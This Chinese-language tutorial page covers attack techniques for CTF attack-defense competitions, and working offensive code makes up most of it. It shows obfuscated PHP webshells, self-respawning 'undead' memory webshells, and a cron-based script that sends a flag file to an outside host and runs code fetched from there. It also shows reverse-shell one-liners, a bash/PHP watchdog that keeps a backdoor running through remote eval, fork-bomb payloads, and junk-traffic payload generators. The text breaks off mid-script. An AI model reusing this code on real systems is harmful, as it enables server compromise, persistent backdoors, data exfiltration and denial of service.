title="漏洞挖掘"></a>漏洞挖掘</h2><p>在CTF攻防赛中，比赛的语言以PHP居多，漏洞的类型主要为后门漏洞、注入类型、文件上传、文件包含、代码执行、命令执行或互联网已公开的已知CMS漏洞。因此在比赛中，漏洞挖掘主要是以这几种漏洞为主。</p><p>漏洞挖掘阶段，首先将备份的源代码使用D盾进行查杀，筛选出D盾扫描出的木马文件然后在服务器上将其删除。对于其他类型的漏洞，主要还是通过白盒与黑盒方式进行漏洞挖掘。黑盒的方式与渗透测试有点相似，而白盒测试中，笔者使用的工具为“Seay源代码审计系统”，根据工具列出的漏洞描述去尽可能找上述的漏洞类型</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><ol><li>生成“.”开头的隐藏文件。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);    </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ol start="2"><li>生成“-”开头的文件。</li></ol><p>-开头的文件，如果使用rm直接删除，将无法删除，因为rm命令将会把-后面的字符串当作参数去执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JD:~/test<span class="comment"># echo &quot;123&quot; &gt; -test.php</span></span><br><span class="line">root@JD:~/test<span class="comment"># rm -test.php </span></span><br><span class="line"><span class="built_in">rm</span>: invalid option -- <span class="string">&#x27;t&#x27;</span></span><br><span class="line">Try <span class="string">&#x27;rm ./-test.php&#x27;</span> to remove the file <span class="string">&#x27;-test.php&#x27;</span>.</span><br><span class="line">Try <span class="string">&#x27;rm --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@JD:~/test<span class="comment"># </span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用不死马。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">    <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.config.php&quot;</span>, <span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上述代码的意思为：首先代码设置程序永久执行直到程序结束，并且客户端关闭后仍然可以执行PHP代码，可保持PHP进程一直在执行。然后删除自己后进入循环，循环生成木马文件。由于源木马已自删除，且已注入内存中执行，想让程序停止，只能是重启服务，或者找出此程序的进程然后kill。</p><p>也可使用不死马生成“-”开头的木马文件</p><h2 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h2><p>自动化攻击在CTF线下攻防赛的体现是自动化打payload获取到Flag然后自动提交的过程</p><p>批量攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Starting attack framework...&quot;</span></span><br><span class="line">    round_time = <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Round time : %s seconds...&quot;</span> % (round_time)</span><br><span class="line">    wait_time = round_time / <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Wait time : %s seconds...&quot;</span> % (wait_time)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   exploit_all()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] This round is finished , waiting for the next round...&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(wait_time):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] The next attack is %d seconds later...&quot;</span> % (wait_time - i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host, port</span>):</span><br><span class="line">    flag = get_flag(host, port)</span><br><span class="line">    submit_flag(flag, token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_all</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;targets&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    host = line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port = <span class="built_in">int</span>(line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Exploiting : %s:%d&quot;</span> % (host, port)</span><br><span class="line">    exploit(host, port) </span><br></pre></td></tr></table></figure><h3 id="RCE-之后"><a href="#RCE-之后" class="headerlink" title="RCE 之后"></a>RCE 之后</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>webshell最好有一定的伪装性，文件名可以以 . 开头。<br>对于不同肉鸡上的webshell设置不同密码，防止别人用你的马来收flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uf</span>=<span class="string">&quot;snc3&quot;</span>;</span><br><span class="line"><span class="variable">$ka</span>=<span class="string">&quot;IEBldmFbsK&quot;</span>;</span><br><span class="line"><span class="variable">$pjt</span>=<span class="string">&quot;CRfUE9TVF&quot;</span>;</span><br><span class="line"><span class="variable">$vbl</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ti&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;tistittirti_rtietipltiatice&quot;</span>);</span><br><span class="line"><span class="variable">$iqw</span>=<span class="string">&quot;F6ciddKTs=&quot;</span>;</span><br><span class="line"><span class="variable">$bkf</span> = <span class="variable">$vbl</span>(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;kbakske6k4k_kdkekckokdke&quot;</span>);</span><br><span class="line"><span class="variable">$sbp</span> = <span class="variable">$vbl</span>(<span class="string">&quot;ctw&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;</span>);</span><br><span class="line"><span class="variable">$mpy</span> = <span class="variable">$sbp</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$bkf</span>(<span class="variable">$vbl</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$ka</span>.<span class="variable">$pjt</span>.<span class="variable">$uf</span>.<span class="variable">$iqw</span>))); <span class="variable">$mpy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_uU</span>=<span class="title function_ invoke__">chr</span>(<span class="number">99</span>).<span class="title function_ invoke__">chr</span>(<span class="number">104</span>).<span class="title function_ invoke__">chr</span>(<span class="number">114</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_uU</span>;</span><br><span class="line"><span class="variable">$_cC</span>=<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">118</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">108</span>).<span class="variable">$_uU</span>(<span class="number">40</span>).<span class="variable">$_uU</span>(<span class="number">36</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">80</span>).<span class="variable">$_uU</span>(<span class="number">79</span>).<span class="variable">$_uU</span>(<span class="number">83</span>).<span class="variable">$_uU</span>(<span class="number">84</span>).<span class="variable">$_uU</span>(<span class="number">91</span>).<span class="variable">$_uU</span>(<span class="number">49</span>).<span class="variable">$_uU</span>(<span class="number">93</span>).<span class="variable">$_uU</span>(<span class="number">41</span>).<span class="variable">$_uU</span>(<span class="number">59</span>);<span class="variable">$_fF</span>=<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">114</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">102</span>).<span class="variable">$_uU</span>(<span class="number">117</span>).<span class="variable">$_uU</span>(<span class="number">110</span>).<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">105</span>).<span class="variable">$_uU</span>(<span class="number">111</span>).</span><br><span class="line"></span><br><span class="line"><span class="variable">$_uU</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_cC</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_fF</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$_cC</span>);@<span class="variable">$_</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//eval($_POST[1]) </span></span><br></pre></td></tr></table></figure><h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_memery_webshell</span>(<span class="params">url, directory, password</span>):</span><br><span class="line">    sleep_time = <span class="number">500</span> <span class="comment"># micro second</span></span><br><span class="line">    code = <span class="string">&quot;&lt;?php $content = &#x27;&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;&#x27;; $writable_path = &#x27;%s&#x27;; $filename = &#x27;.%s.php&#x27;; $path = $writable_path.&#x27;/&#x27;.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot;</span> % (password, directory, password, sleep_time)</span><br><span class="line">filename = <span class="string">&quot;.%s.php&quot;</span> % (password)</span><br><span class="line">    path = <span class="string">&quot;%s/%s&quot;</span> % (directory, filename)</span><br><span class="line">    payload = <span class="string">&quot;file_put_contents(&#x27;%s&#x27;, base64_decode(&#x27;%s&#x27;));&quot;</span> % (path, code.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">return</span> code_exec(url, payload).split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_memery_webshell</span>(<span class="params">url, directory, password</span>):</span><br><span class="line">    sleep_time = <span class="number">500</span> <span class="comment"># micro second</span></span><br><span class="line">    code = <span class="string">&quot;&lt;?php $content = &#x27;&lt;?php eval($_REQUEST[%s]);?&gt;&#x27;; $writable_path = &#x27;%s&#x27;; $filename = &#x27;.%s.php&#x27;; $path = $writable_path.&#x27;/&#x27;.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot;</span> % (password, directory, password, sleep_time)</span><br><span class="line">filename = <span class="string">&quot;.%s.php&quot;</span> % (password)</span><br><span class="line">    path = <span class="string">&quot;%s/%s&quot;</span> % (directory, filename)</span><br><span class="line">    payload = <span class="string">&quot;file_put_contents(&#x27;%s&#x27;, base64_decode(&#x27;%s&#x27;));&quot;</span> % (path, code.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> shell_exec(url, payload).split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">active_memery_webshell</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] OK!&quot;</span> </span><br></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span>=<span class="string">&quot;* * * * * curl 192.168.136.1:8098/?flag=<span class="subst">$(cat /var/www/html/flag)</span>&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&quot;</span>;</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(0);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="variable">$x</span> =file_get_contents(<span class="string">&#x27;/var/www/html/flag&#x27;</span>);</span><br><span class="line">file_get_contents(<span class="string">&#x27;http://192.168.136.1:8099/test.php?token=kericwy&amp;flag=&#x27;</span>.<span class="variable">$x</span>);</span><br><span class="line"><span class="built_in">sleep</span>(5);</span><br><span class="line">system(<span class="string">&quot;echo &#x27;<span class="variable">$message</span>&#x27; &gt; /tmp/1 ;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;crontab /tmp/1;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;rm /tmp/1;&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=file_get_contents(<span class="string">&#x27;http://192.168.136.1:8100/1.txt&#x27;</span>);</span><br><span class="line">system(<span class="variable">$c</span>); </span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在bash下可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;127.0.0.1&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span>         </span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><h3 id="进程守护"><a href="#进程守护" class="headerlink" title="进程守护"></a>进程守护</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [[ : ]]; <span class="keyword">do</span></span><br><span class="line"><span class="comment"># tell php that i am living</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Creating lock file...&quot;</span></span><br><span class="line">touch -a $&#123;bash_lock_file&#125;</span><br><span class="line"><span class="comment"># check php is living or not</span></span><br><span class="line">last_access_time=`stat -c %X $&#123;php_lock_file&#125;`</span><br><span class="line">now_time=`date +%s`</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;php last alive time : $&#123;last_access_time&#125;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $[ <span class="variable">$now_time</span> - <span class="variable">$last_access_time</span> ];</span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;$&#123;php_lock_file&#125;&quot;</span> ] || [ $[ <span class="variable">$now_time</span> - <span class="variable">$last_access_time</span> ] -gt $((sleep_time+<span class="number">1</span>)) ]; then</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[-] php script is dead!&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;downloading php script&quot;</span></span><br><span class="line">wget $&#123;php_url&#125; -O <span class="variable">$target_path</span> &amp;&amp; curl $&#123;start_url&#125; -m $&#123;time_out&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP script is alive...&quot;</span></span><br><span class="line">fi</span><br><span class="line"><span class="comment"># sleeping</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;sleeping...&quot;</span></span><br><span class="line">sleep $&#123;sleep_time&#125;</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sleep_time</span> = <span class="number">3</span>; <span class="comment">// max sleep_time : 3 seconds</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$bash_url</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">// tell bash that i am living</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Telling bash that i am alive...\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">touch</span>(<span class="variable">$php_lock_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP Lock file last accessed : &quot;</span>.(<span class="title function_ invoke__">time</span>() - <span class="title function_ invoke__">fileatime</span>(<span class="variable">$php_lock_file</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// check bash is living or not</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Checking the bash script is alive or not...\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$bash_lock_file</span>) &amp;&amp; ((<span class="title function_ invoke__">time</span>() - <span class="title function_ invoke__">fileatime</span>(<span class="variable">$bash_lock_file</span>)) &lt; (<span class="variable">$sleep_time</span> + <span class="number">1</span>))))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The bash script is dead!\n&quot;</span>;</span><br><span class="line"><span class="comment">// download bash script</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Downloading bash script...\n&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$bash_path</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// restart bash script</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Restarting bash script...\n&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;nohup bash &#x27;</span>.<span class="variable">$bash_path</span>.<span class="string">&#x27; &amp;&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// control loop speed</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sleeping...\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="variable">$sleep_time</span>);</span><br><span class="line"><span class="comment">// backdoor</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Executing backdoor...&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$code_url</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="fork炸弹"><a href="#fork炸弹" class="headerlink" title="fork炸弹"></a>fork炸弹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;192.168.50.57&quot;</span></span><br><span class="line">    port = <span class="string">&quot;80&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://%s:%s/code.php&quot;</span> % (host, port)</span><br><span class="line">    code = <span class="string">&quot;system(\&quot;echo &#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27; &gt; /tmp/aaa\&quot;);system(\&quot;/bin/bash /tmp/aaa\&quot;);echo \&quot;seems good!\&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span> code_exec(url, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="string">&quot;80&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://%s:%s/c.php&quot;</span> % (host, port)</span><br><span class="line">    command = <span class="string">&quot;:()&#123; :|: &amp; &#125;;:&quot;</span></span><br><span class="line">    shell_exec(url, command) </span><br></pre></td></tr></table></figure><h3 id="垃圾流量生成"><a href="#垃圾流量生成" class="headerlink" title="垃圾流量生成"></a>垃圾流量生成</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_all</span>(<span class="params">root, arg</span>):</span><br><span class="line">    <span class="built_in">all</span> = []</span><br><span class="line">    result = os.walk(root)</span><br><span class="line">    <span class="keyword">for</span> path,d,filelist <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> filelist:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&quot;.php&quot;</span>):</span><br><span class="line">               full_path = path + <span class="string">&quot;/&quot;</span> + file</span><br><span class="line">               content = get_content(full_path)</span><br><span class="line">               <span class="built_in">all</span>.append((<span class="string">&quot;/&quot;</span> + file, find_arg(content, arg)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_GET&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_POST&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_COOKIE&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fake_plain_payloads</span>(<span class="params">flag_path</span>):</span><br><span class="line">    payloads = []</span><br><span class="line">    payloads.append(<span class="string">&#x27;system(&quot;cat %s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;highlight_file(&quot;%s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;echo file_get_contents(&quot;%s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;var_dump(file_get_contents(&quot;%s&quot;));&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;print_r(file_get_contents(&quot;%s&quot;));&#x27;</span> % (flag_path))</span><br><span class="line">    <span class="keyword">return</span> payloads</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fake_base64_payloads</span>(<span class="params">flag_path</span>):</span><br><span class="line">    payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    <span class="keyword">return</span> [payload.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="keyword">for</span> payload <span class="keyword">in</span> payloads]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_path = <span 